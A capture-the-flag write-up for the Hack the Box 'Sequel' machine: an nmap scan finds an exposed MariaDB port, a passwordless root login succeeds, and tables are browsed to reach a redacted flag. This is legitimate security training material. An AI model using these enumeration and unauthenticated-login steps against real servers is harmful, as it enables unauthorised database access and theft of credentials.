+++
title = "Sequel on Hack the Box Write-up"
author = ["funcsec"]
date = 2022-01-19
publishDate = 2022-01-19
lastmod = 2022-01-23T20:09:44-08:00
tags = ["mysql"]
categories = ["writeup", "redteam"]
draft = false
toc = "true +"
omit_header_text = "+"
background_color_class = "bg-black-60"
description = "Write-up for the Hack the Box Sequel server"
featured_image = "images/william-michael-harnett_memento-mori.jpg"
images = ["images/william-michael-harnett_memento-mori.jpg"]
+++

Quick little `mysql` vulnerability.
A lession in misconfiguration.

---


## Executive Summary {#executive-summary}

The target machine had an open database port which also had no password to access the service.
This was a [Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/).


## Methodology {#methodology}

To begin,  the target machine was enumerated using `nmap`.
The output of `nmap` will show the open ports and potentially try to identify services of a target machine.

```bash
nmap -sV -sC $ip
```

The variable `$ip` was substituted for the ip address of the target machine.

```text
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-18 23:10 EST
Nmap scan report for 10.129.95.232
Host is up (0.075s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
| mysql-info:
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 336
|   Capabilities flags: 63486
|   Some Capabilities: Support41Auth, DontAllowDatabaseTableColumn, SupportsTransactions, InteractiveClient, ConnectWithDatabase, Speaks41ProtocolOld, IgnoreSigpipes, IgnoreSpaceBeforeParenthesis, FoundRows, SupportsCompression, LongColumnFlag, SupportsLoadDataLocal, ODBCClient, Speaks41ProtocolNew, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: */KkY^K>5,|OT8\E'2d"
|_  Auth Plugin Name: mysql_native_password

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 209.29 seconds
```

The output of `nmap` indicated that there was an open `mysql` port, specifically running MariaDB version 10.3.27.
A common miss configuration for `mysql` is too fail to configure the root password for the `mysql root` user.
This is different from the system root user and can have a different password or no password at all.
Best practice is not to expose database ports to the open internet, only machines that require access to the database.

The target machine may not have a root `mysql` password configured.

```bash
IP=$ip
PORT=3306
mysql -h "$IP" -P "$PORT" -u root -p
```

```text
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 344
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```

Logging in with the root user with no password was successful.
This offer and full control over the target machine's `mysql` service.
The server distribution of Debian 10 (buster) was present in the output from the `mysql` service.
The `mysql` databases were then searched for interesting data.

```text
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.075 sec)
```

The only unique database was `htb`, the rest of them are standard to `mysql`.
It was likely that the flag data was contained in that database.

```text
MariaDB [(none)]> use htb;

Database changed
MariaDB [htb]> show tables;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0.100 sec)
```

A `config` table is often where other important information pertaining to an application.
A `users` table might be helpful in collecting user credentials or social engineering materials.
A flag might be in either, but `config` was accessed first.

```text
MariaDB [htb]> select * from config;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | [[ REDACTED ]]                   |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
7 rows in set (0.073 sec)
```

The flag was in the `config` table and the flag value was `flag{[[ REDACTED ]]}`.

---

One simple vulnerability, and a quick turnaround.
Good to put in a couple `SQL` queries every now and again.